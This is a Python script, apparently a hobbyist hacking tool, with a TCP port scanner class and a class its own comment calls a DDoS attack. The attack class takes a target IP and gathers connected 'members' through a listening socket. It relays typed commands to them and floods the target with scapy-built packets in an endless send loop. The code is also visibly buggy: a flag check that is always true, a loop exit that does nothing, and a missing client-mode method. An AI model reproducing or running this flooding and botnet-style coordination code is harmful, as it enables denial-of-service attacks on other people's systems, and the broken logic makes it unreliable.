from scapy.all import ICMP, ARP, IP, UDP, TCP, Ether, RandShort, RandIP, send
from threading import Thread
import socket
import Menus

#The below calss implements a port scanner
class PortScanner:
    def __init__(self):
        self.Ip = "127.0.0.1"
        self.RangeOfPorts = 1000
        self.OSDetection = False

        self.Ip = input("\n\n\n   [*]Port scanner has started\n   [*]Enter the destination ip(default is localhost): ")
        self.RangeOfPorts = int(input("   [*]Enter the number of ports to be scanned(default is 1000): "))
        if input("   [*]Would you like to activate os detection(y/n): ") == 'y':
            self.OSDetection = True
        else:
            self.OSDetection = False
        print("\n\n   [*]Data is being is processed...\n\n")
        self._ScanPorts()

    def _ScanPorts(self):
        self.Scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        for num in range(1, self.RangeOfPorts):
            ReturnCode = self.Scanner.connect_ex((self.Ip, num))
            print(ReturnCode)
            if ReturnCode == 0:
                print(f"[*]   Port {num} is open")
            elif ReturnCode == 100 or ReturnCode == 101:
                print(f"[!]   Host is down\\unreachable")
                #quits the loop
                num = self.RangeOfPorts + 1

        self.Scanner.close()


#The below class implements a ddos attack
class Ddos:
    def __init__(self):
        self.Join = True
        self.Attack = False
        self.Flags = {
            "FIN": 0x01,
            "SYN": 0x02,
            "RST": 0x04,
            "PSH": 0x08,
            "ACK": 0x10,
            "URG": 0x20,
            "ECE": 0x40,
            "CWR": 0x80
        }
        self.Protocol = {
            "tcp": False,
            "udp": False
        }
        mode = input("\n   [*]choose mode(server or client): ")
        if mode == "server":
            self._ServerMode()
        elif mode == "client":
            self.ClientMode()

    def _ServerMode(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Ip = input("\n   [*]Ip to be bound: ")

        self.TargetIp = input("\n   [*]Enter target ip: ")

        self.Port = int(input("\n   [*]Port to listen on: "))

        self.sock.bind((Ip, self.Port))

        NumOfPeople = int(input("\n   [*]Max number of members to join: "))

        self.sock.listen(NumOfPeople)

        self.PacketBlueprint = IP(dst=self.TargetIp)

        thrd = Thread(target=self._JoinParty, args=())
        thrd.start()

        Protocol = ""
        Flag = ""
        while True:
            Input = input("   host@command>")
            if Input == "start attack":
                self.Attack = True
                self.AttackTarget()
            elif Input == "stop attack":
                self.Attack = False
            elif Input == "stop join":
                self.Join = False
            elif Input == "show packet":
                print(self.PacketBlueprint.show())
            elif Input == "resume join":
                self.Join = True
            elif Input[0: 9] == "-protocol":
                for char in range(10, len(Input)):
                    Protocol += Input[char]
                if Protocol == "udp":
                    self.Protocol["udp"] = True
                elif Protocol == "tcp":
                    self.Protocol["tcp"] = True
                else:
                    print(f"\n   [!]Not a valid protocol parameter:{Protocol}")
                Protocol = ""
            elif Input[0:6] == "-flag" and self.Protocol.get("tcp"):
                flag: int = 0
                for char in range(6, len(Input)):
                    if (Flag == "SYN" or "URG" or "UDP" or "CWR" or "RST" or "FIN" or "ECE" or "PSH" or "ACK"):
                        flag += int(self.Flags.get(Flag))
                        self.PacketBlueprint[TCP].flags = self.PacketBlueprint / TCP(flags=flag)
                        Flag = ""
                    Flag += Input[char]
            elif Input == "-help":
                print(Menus.HelpMenu)
            elif Input == "exit":
                self.sock.close()
                break
            else:
                for i in range(len(self.members)):
                    self.members[i].send(f"{Input}\n".encode())
        self.Join = False

    def AttackTarget(self):
        print("   in attack function")
        while self.Attack:
            send(self.PacketBlueprint, verbose=False)

    def _JoinParty(self):
        self.members = []
        self.sock.setblocking(False)
        while True:
            if self.Join:
                try:
                    self.members.append(self.sock.accept()[0])
                except Exception:
                    pass
            else:
                pass
